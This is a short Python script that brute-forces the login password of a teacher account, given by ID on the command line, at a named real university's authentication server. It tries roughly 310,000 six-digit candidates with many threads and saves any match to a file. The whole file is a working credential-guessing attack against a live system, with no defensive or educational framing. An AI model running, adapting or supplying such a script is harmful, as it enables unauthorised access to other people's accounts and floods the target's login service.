import sys
import threading

import requests

api = 'http://ids2.hznu.edu.cn/amserver/UI/Login'

if len(sys.argv) <= 1:
    print('argv not has the teacher number')
    exit()

number = sys.argv[1]

data = {
    'IDToken0': '',
    'IDToken1': number,
    'IDToken2': '',
    'IDButton': '登陆',
    'goto': '',
    'encoded': 'false',
    'gx_charset': 'UTF-8',
}

LOCK = True


def random_handle(X, Y):
    # 随机三位
    global LOCK
    for z in range(0, 1000):
        if z < 10:
            Z = '00' + str(z)
        elif 100 > z >= 10:
            Z = '0' + str(z)
        else:
            Z = str(z)
        PWD = X + Y + Z
        data['IDToken2'] = PWD
        resp = requests.post(api, data=data)
        if '密码有误' in str(resp.text):
            print('user : %s\'s pwd is not %s' % (data['IDToken1'], PWD))
        else:
            with open('pwd.txt', 'w+') as file:
                text = 'user : %s\'s pwd is %s\n' % (data['IDToken1'], PWD)
                print(text)
                file.write(text)
            LOCK = False
            return


def date_handle(X):
    global LOCK
    if not LOCK:
        return
    # 日期2位
    for y in range(1, 32):
        if y < 10:
            Y = '0' + str(y)
        else:
            Y = str(y)
        t = threading.Thread(target=random_handle, args=(X, Y))
        t.start()


def crack_pwd():
    # 月份个位
    for x in range(0, 10):
        X = str(x)
        t = threading.Thread(target=date_handle, args=(X,))
        t.start()


crack_pwd()
